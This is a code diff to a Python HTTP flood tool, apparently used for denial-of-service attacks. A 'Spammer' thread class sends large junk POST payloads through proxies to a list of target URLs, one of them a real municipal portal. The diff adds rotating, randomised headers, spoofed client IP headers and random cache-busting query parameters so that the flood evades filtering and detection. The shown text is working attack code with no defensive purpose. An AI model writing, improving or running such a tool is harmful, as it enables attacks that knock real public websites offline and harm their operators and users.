@@ -8237,31 +8237,48 @@ infinite_loop_urls = [
     "http://portal.veendam.nl"
 ]
 
-def generate_large_payload(size=10**6):
+# Generate dynamic payloads
+def generate_large_payload(size=None):
+    if size is None:
+        size = random.randint(512000, 2048000)  # 500KB to 2MB
     return "A" * size
+
+# Dynamic query generator
+def generate_query_params(count=50):
+    return "&".join(
+        [f"param{random.randint(0, 99999)}={random.randint(0, 99999)}" for _ in range(count)]
+    )
 
 class Spammer(threading.Thread):
     def __init__(self, url, number, proxy_list):
         threading.Thread.__init__(self)
-        self.url = url + "?" + "&".join(
-            [f"param{random.randint(0, 99999)}={random.randint(0, 99999)}" for _ in range(50)]
-        )
+        self.url = url + "?" + generate_query_params()  # Dynamic query params
         self.num = number
-        self.headers = {
-            'User-Agent': random.choice(ua),
-            'Keep-Alive': random.randint(110, 9960),
-            'Referer': random.choice(ref),
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
-            'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Cache-directive': 'no-cache',
-            'Pragma': 'no-cache',
-            'Upgrade-Insecure-Requests': '1',
-            'X-Forwarded-For': random.choice(spoofed_ips),
-        }
         self.proxy_list = proxy_list
         self.lock = threading.Lock()
+
+    def rotate_headers(self):
+        return {
+            'User-Agent': random.choice(ua) + str(random.randint(1000, 9999)),
+            'Keep-Alive': str(random.randint(110, 9960)),
+            'Referer': random.choice(ref) + str(random.randint(1000, 9999)),
+            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+            'Accept-Encoding': random.choice(['gzip, deflate, br', 'compress, gzip', 'identity']),
+            'Connection': random.choice(['Keep-Alive', 'close']),
+            'Cache-Control': random.choice(['no-cache', 'no-store', 'must-revalidate', 'max-age=0']),
+            'Cache-directive': 'no-cache',
+            'Pragma': random.choice(['no-cache', '']),
+            'Upgrade-Insecure-Requests': str(random.randint(0, 1)),
+            'X-Forwarded-For': random.choice(spoofed_ips),
+            'X-Requested-With': random.choice(['XMLHttpRequest', 'Fetch']),
+            'X-Real-IP': random.choice(spoofed_ips),
+            'DNT': random.choice(['1', '0']),
+            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
+            'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
+            'Sec-Fetch-User': random.choice(['?1', '?0']),
+            'Sec-Fetch-Dest': random.choice(['document', 'iframe', 'image', 'script']),
+            'TE': random.choice(['Trailers', 'chunked'])
+        }
 
     def request(self):
         global N
@@ -8274,6 +8291,7 @@ class Spammer(threading.Thread):
         opener = urllib.request.build_opener(proxy_handler)
         urllib.request.install_opener(opener)
 
+        self.headers = self.rotate_headers()  # Rotate headers for each request
         req = urllib.request.Request(self.url, data.encode('utf-8'), self.headers)
         urllib.request.urlopen(req)
 
@@ -8303,7 +8321,7 @@ class MainLoop:
             if not url.startswith(("http://", "https://")):
                 url = "https://" + url
             try:
-                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
+                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua) + str(random.randint(1000, 9999))})
                 urllib.request.urlopen(req)
                 break
             except:
